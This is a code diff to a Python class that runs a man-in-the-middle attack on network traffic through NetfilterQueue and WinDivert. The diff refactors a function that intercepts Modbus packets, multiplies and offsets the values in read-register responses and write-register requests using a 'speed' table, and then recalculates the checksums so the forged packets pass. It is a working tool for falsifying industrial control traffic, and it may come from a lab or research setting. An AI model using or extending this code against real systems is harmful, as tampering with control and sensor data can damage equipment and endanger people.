@@ -42,7 +42,7 @@ class NetFilterQueue:
         if self.is_running():
             self.buffer.put("mitm", "MITM attack is already running")
             return
-        self.callback = self.modify_and_accept
+        self.callback = self.nfq_callback
         self.windows_callback = None
         self.stop_event = threading.Event()
         self.buffer.put("mitm", "Starting MITM attack")
@@ -76,8 +76,9 @@ class NetFilterQueue:
                         w.send(packet)
                         continue
 
-                    newspkt = spkt # Alter packet here
-                    self.buffer.put("mitm", "WinDivert Packet", spkt)
+                    self.buffer.put("mitm", "Incoming mitm packet", spkt)
+                    newspkt = self.modify_spkt(spkt)
+                    self.buffer.put("mitm", "Outgoing mitm Packet", spkt)
 
                     if newspkt is not None:
                         packet.payload = bytes(newspkt)
@@ -89,7 +90,8 @@ class NetFilterQueue:
                         "mitm",
                         f"WinDivert error: {e}"
                     )
-                    break
+                    self.buffer.put("mitm", "Problematic Packet", spkt)
+                    pass
 
         self.buffer.put("mitm", "Stopped WinDivert")
 
@@ -188,19 +190,36 @@ class NetFilterQueue:
 
 
     # Callbacks
+
+    def nfq_callback(self, pkt: Packet):
+        spkt = IP(pkt.get_payload())
+        self.buffer.put("mitm", "incoming mitm packet", spkt)
+        
+        spkt = self.modify_spkt(spkt)
+
+        self.buffer.put("mitm", "outgoing mitm packet", spkt)
+
+        pkt.set_payload(bytes(spkt))
+        pkt.accept()
+
+    
     def accept_only(self, pkt: Packet):
         pkt.accept()
     
+
     def print_and_accept(self, pkt: Packet):
         spkt = IP(pkt.get_payload())
         self.buffer.put("mitm", "Incoming Packet", spkt)
         pkt.accept()
         self.buffer.put("mitm", "Outgoing Packet", spkt)
 
-    def modify_and_accept(self, pkt: Packet):
-        spkt = IP(pkt.get_payload())
+
+    def modify_spkt(self, spkt: Packet) -> Packet:
+        '''
+        Returns a packet, modified according to the mod table
+        '''
+        modified_flag = False
         if spkt.haslayer("Read Holding Registers Response"):
-            self.buffer.put("mitm", "Incoming Modbus Packet", spkt)
             mult = self.table.get_raw("speed", "mult")
             offset = self.table.get_raw("speed", "offset")
 
@@ -219,8 +238,9 @@ class NetFilterQueue:
                 val = max(0, min(65535, val))
                 mbl.payload.registerVal[1] = val
 
+            modified_flag = True
+
         elif spkt.haslayer("Write Single Register"):
-            self.buffer.put("mitm", "Incoming Modbus Packet", spkt)
 
             mbl = spkt.getlayer(ModbusADURequest)
 
@@ -238,18 +258,14 @@ class NetFilterQueue:
             val = max(0, min(65535, val))
             mbl.payload.registerValue = val
 
-        else:
-            pkt.accept()
-            return
+            modified_flag = True
 
-        # Recalculate checksums
-        # del mbl.len
-        del spkt[IP].len
-        del spkt[TCP].chksum
-        del spkt[IP].chksum
+        # Recalculate checksums if modified
+        if modified_flag:
+            # del mbl.len
+            del spkt[IP].len
+            del spkt[TCP].chksum
+            del spkt[IP].chksum
 
-        spkt = IP(bytes(spkt))
-        pkt.set_payload(bytes(spkt))
-        pkt.accept()
-
-        self.buffer.put("mitm", "Outgoing Modbus Packet", spkt)
+            spkt = IP(bytes(spkt))
+        return spkt
